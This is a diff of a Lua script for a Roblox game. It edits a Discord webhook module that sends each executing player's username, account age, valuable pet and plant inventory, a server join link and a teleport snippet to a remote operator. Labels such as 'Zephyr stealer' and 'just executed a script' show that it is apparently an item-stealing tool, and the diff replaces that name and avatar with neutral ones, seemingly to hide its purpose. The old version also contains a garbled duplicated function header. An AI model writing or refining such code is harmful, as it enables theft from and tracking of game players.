@@ -389,97 +389,19 @@ local DiscordWebhook = {}
 function DiscordWebhook.createEmbed(itemsToSend, totalValue, hasTargets, priorityPlayer)
     local inventoryReport = ""
     local hasRarePet = false
-
-    for _, item in ipairs(itemsToSend) do
-        local displayName = item.Name
-
-        if item.Type == "Pet" then
-            local emoji = Utils.getEmojiForPet(item.Name)
-            displayName = emoji .. " " .. item.Tool.Name
-            hasRarePet = hasRarePet or item.IsTarget
-        elseif item.Type == "Plant" then
-            displayName = ":deciduous_tree: " .. item.Name
-        else
-            displayName = ":dog: " .. item.Name
-        end
-
-        inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "
-"
-    end
-
-    if inventoryReport == "" then
-        inventoryReport = "No items found."
-    end
-
-    local accountAge = LocalPlayer.AccountAge
-    local username = LocalPlayer.Name
-    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    local fernLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)
-
-    return {
-        ["title"] = "**Inventory Report**",
-        ["description"] = "Player inventory details just executed a script.",
-        ["color"] = 65280,
-        ["fields"] = {
-            {
-                ["name"] = "👤 Username",
-                ["value"] = username,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "📅 Account Age",
-                ["value"] = tostring(accountAge) .. " days",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "💰 Total Inventory Value",
-                ["value"] = Utils.formatNumber(totalValue) .. " R$",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🎒 Inventory Items",
-                ["value"] = inventoryReport,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "🌐 Fern Join Link",
-                ["value"] = "[Click to join this server](" .. fernLink .. ")",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "🌀 Game Server Teleporter",
-                ["value"] = "```lua
-" .. string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId) .. "
-```",
-                ["inline"] = false
-            }
-        },
-        ["thumbnail"] = {
-            ["url"] = avatarUrl
-        },
-        ["footer"] = {
-            ["text"] = "Inventory auto-report with true value calculation 🌿"
-        },
-        ["timestamp"] = DateTime.now():ToIsoDate()
-    }
-end, totalValue, hasTargets, priorityPlayer)
-    local inventoryReport = ""
-    local hasRarePet = false
     
     for _, item in ipairs(itemsToSend) do
         local displayName = item.Name
 
-        if item.Type == "Pet" and item.IsTarget then
-            local emoji = Utils.getEmojiForPet(item.Name)
-            displayName = emoji .. " " .. displayName
-            hasRarePet = true
-        elseif item.Type == "Plant" then
-            displayName = ":deciduous_tree: " .. displayName
-        else
-            displayName = ":dog: " .. displayName
-        end
+        if item.Type == "Pet" then
+    local emoji = Utils.getEmojiForPet(item.Name)
+    displayName = emoji .. " " .. item.Tool.Name
+    hasRarePet = hasRarePet or item.IsTarget
+elseif item.Type == "Plant" then
+    displayName = ":deciduous_tree: " .. item.Name
+else
+    displayName = ":dog: " .. item.Name
+end
 
         inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "\n"
     end
@@ -552,9 +474,9 @@ function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorit
     
     local payload = {
         ["content"] = contentMsg,
-        ["username"] = "Zephyr stealer",
+        ["username"] = finalUsername,
         ["embeds"] = {embed},
-        ["avatar_url"] = "https://i.postimg.cc/85rWVH87/file-00000000feb861f5b33ef5b7b42b6598.png"
+        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
     }
     
     pcall(function()
